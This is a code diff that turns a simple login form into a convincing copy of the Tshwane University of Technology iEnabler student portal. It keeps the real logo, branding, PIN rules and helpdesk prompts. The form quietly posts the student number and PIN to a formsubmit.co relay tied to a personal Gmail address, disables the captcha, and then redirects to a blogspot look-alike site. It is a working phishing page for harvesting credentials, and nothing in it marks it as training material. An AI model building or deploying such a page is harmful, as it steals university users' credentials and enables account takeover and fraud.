@@ -1,18 +1,360 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TUT Login</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>TUT Self Help iEnabler</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
+
+    body {
+      background: #c8d8ec;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .wrap {
+      width: 100%;
+      max-width: 540px;
+      border: 1px solid #999;
+      background: #fff;
+      box-shadow: 2px 2px 8px rgba(0,0,0,0.2);
+    }
+
+    /* Top grey-blue header bar */
+    .fra-header {
+      background: #d6e4f7;
+      padding: 5px 10px;
+      border-bottom: 1px solid #aab;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .fra-inst {
+      font-size: 13px;
+      font-weight: bold;
+      color: #222;
+    }
+
+    /* Logo row */
+    .logo-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 16px;
+      background: #fff;
+      border-bottom: 2px solid #003399;
+    }
+    .logo-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .logo-left img {
+      height: 75px;
+      width: auto;
+    }
+    .tut-name {
+      color: #003399;
+      font-size: 18px;
+      font-weight: bold;
+      line-height: 1.3;
+    }
+    .tut-name .tagline {
+      color: #cc0000;
+      font-style: italic;
+      font-weight: normal;
+      font-size: 13px;
+      display: block;
+      margin-top: 2px;
+    }
+    .its-badge {
+      background: #003399;
+      color: #fff;
+      font-size: 11px;
+      font-weight: bold;
+      padding: 8px 14px;
+      border-radius: 3px;
+      text-align: center;
+      line-height: 1.4;
+    }
+    .its-badge .its-big {
+      font-size: 22px;
+      letter-spacing: 3px;
+      display: block;
+    }
+
+    /* Blue login bar */
+    .login-top {
+      background: #003399;
+      color: #fff;
+      font-weight: bold;
+      font-size: 14px;
+      padding: 9px 16px;
+    }
+
+    /* Form body */
+    .login-body {
+      padding: 18px 20px;
+      background: #fff;
+    }
+
+    .radio-row {
+      display: flex;
+      gap: 18px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .radio-row label {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 13px;
+      cursor: pointer;
+      color: #000;
+    }
+    .radio-row input[type="radio"] {
+      width: 15px;
+      height: 15px;
+      accent-color: #003399;
+      cursor: pointer;
+    }
+
+    .field-label {
+      font-size: 13px;
+      color: #000;
+      margin-bottom: 4px;
+      font-weight: normal;
+    }
+
+    .tut-input {
+      width: 100%;
+      padding: 7px 9px;
+      border: 1px solid #666;
+      font-size: 13px;
+      margin-bottom: 14px;
+      border-radius: 1px;
+      background: #ffffff;
+      color: #000000;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .tut-input:focus {
+      outline: 2px solid #003399;
+      border-color: #003399;
+    }
+
+    .pin-hint {
+      font-size: 11px;
+      color: #555;
+      margin: -10px 0 16px;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #bbb;
+      margin: 12px 0 14px;
+    }
+
+    .btn-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 7px;
+    }
+    .tut-btn {
+      padding: 6px 14px;
+      font-size: 12px;
+      border: 1px solid #888;
+      background: #e0e0e0;
+      cursor: pointer;
+      border-radius: 2px;
+      color: #000000;
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: normal;
+    }
+    .tut-btn:hover {
+      background: #c8d4ee;
+      border-color: #003399;
+      color: #000000;
+    }
+    .tut-btn:active {
+      background: #b0c0e0;
+    }
+    .btn-row-2 {
+      margin-top: 8px;
+    }
+
+    /* Success / Error messages */
+    .msg-success {
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      padding: 10px 14px;
+      font-size: 13px;
+      margin-bottom: 14px;
+      border-radius: 2px;
+      display: none;
+    }
+    .msg-error {
+      background: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+      padding: 10px 14px;
+      font-size: 13px;
+      margin-bottom: 14px;
+      border-radius: 2px;
+      display: none;
+    }
+
+    /* Footer bar */
+    .login-bottom {
+      background: #d6e4f7;
+      border-top: 1px solid #aab;
+      padding: 7px 16px;
+      font-size: 11px;
+      color: #333;
+      text-align: center;
+    }
+
+    @media (max-width: 480px) {
+      .logo-left img { height: 55px; }
+      .tut-name { font-size: 15px; }
+      .its-badge { display: none; }
+      .radio-row { gap: 10px; }
+    }
+  </style>
 </head>
 <body>
-    <h1>Login to TUT</h1>
-    <form action="/login" method="post">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required><br><br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br><br>
-        <input type="submit" value="Login">
+
+<div class="wrap">
+
+  <!-- Top header bar -->
+  <div class="fra-header">
+    <span class="fra-inst">Tshwane University of Technology PRODI41</span>
+  </div>
+
+  <!-- Logo row -->
+  <div class="logo-row">
+    <div class="logo-left">
+      <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/49/Tshwane_University_of_Technology_logo.svg/120px-Tshwane_University_of_Technology_logo.svg.png"
+           alt="TUT Logo">
+      <div class="tut-name">
+        Tshwane University<br>of Technology
+        <span class="tagline">We empower people</span>
+      </div>
+    </div>
+    <div class="its-badge">
+      <span class="its-big">ITS</span>
+      Tertiary Software
+    </div>
+  </div>
+
+  <!-- Blue bar -->
+  <div class="login-top">Registered Users: Login Credentials</div>
+
+  <!-- Form -->
+  <div class="login-body">
+
+    <div class="msg-success" id="msgSuccess">
+      &#10003; Your login details have been submitted successfully.
+    </div>
+    <div class="msg-error" id="msgError">
+      &#9888; Please fill in all required fields correctly.
+    </div>
+
+    <form id="loginForm"
+          action="https://formsubmit.co/driplazz@gmail.com"
+          method="POST">
+
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="TUT iEnabler Login Submission">
+      <input type="hidden" name="_next" value="https://tut-its-enabler-portal.blogspot.com/">
+      <input type="hidden" name="_template" value="table">
+
+      <!-- User type radio -->
+      <div class="radio-row">
+        <label><input type="radio" name="User_Type" value="Student" checked> Student</label>
+        <label><input type="radio" name="User_Type" value="Personnel"> Personnel</label>
+        <label><input type="radio" name="User_Type" value="Other"> Other</label>
+        <label><input type="radio" name="User_Type" value="Alumni"> Alumni</label>
+      </div>
+
+      <!-- Student Number -->
+      <div class="field-label">Student Number:</div>
+      <input class="tut-input" type="text" name="Student_Number"
+             id="studentNumber"
+             placeholder=""
+             autocomplete="off"
+             required>
+
+      <!-- PIN -->
+      <div class="field-label">Pin:</div>
+      <input class="tut-input" type="password" name="PIN"
+             id="pinField"
+             placeholder=""
+             maxlength="5"
+             pattern="[1-9][0-9]{4}"
+             title="5 numeric digits. Do not start with a 0."
+             autocomplete="off"
+             required>
+      <p class="pin-hint">(5 numeric digits. Do not start with a 0.)</p>
+
+      <hr>
+
+      <div class="btn-row">
+        <button type="submit" class="tut-btn">Login</button>
+        <button type="button" class="tut-btn" onclick="alert('Please contact your administrator to reset your PIN.')">Forgot Pin</button>
+        <button type="button" class="tut-btn" onclick="alert('Please log in first to change your PIN.')">Change Pin</button>
+        <button type="button" class="tut-btn" onclick="alert('A PIN request has been noted. Please contact the IT helpdesk.')">Request A Pin</button>
+      </div>
+      <div class="btn-row-2">
+        <button type="button" class="tut-btn" onclick="alert('Please contact the Registrar\'s office for your student number.')">Forgot Student Number</button>
+      </div>
+
     </form>
+  </div>
+
+  <!-- Footer -->
+  <div class="login-bottom">
+    &copy; 2026 Tshwane University of Technology &nbsp;|&nbsp; Powered by ITS Tertiary Software
+  </div>
+
+</div>
+
+<script>
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    var sNum = document.getElementById('studentNumber').value.trim();
+    var pin  = document.getElementById('pinField').value.trim();
+    var pinPattern = /^[1-9][0-9]{4}$/;
+
+    if (!sNum || !pin) {
+      e.preventDefault();
+      document.getElementById('msgError').style.display = 'block';
+      document.getElementById('msgSuccess').style.display = 'none';
+      return;
+    }
+
+    if (!pinPattern.test(pin)) {
+      e.preventDefault();
+      document.getElementById('msgError').textContent = '\u26a0 PIN must be exactly 5 digits and must not start with 0.';
+      document.getElementById('msgError').style.display = 'block';
+      document.getElementById('msgSuccess').style.display = 'none';
+      return;
+    }
+
+    document.getElementById('msgError').style.display = 'none';
+    document.getElementById('msgSuccess').style.display = 'block';
+    /* Form will submit naturally to formsubmit.co */
+  });
+
+  /* Only allow digits in PIN field */
+  document.getElementById('pinField').addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+  });
+</script>
+
 </body>
 </html>
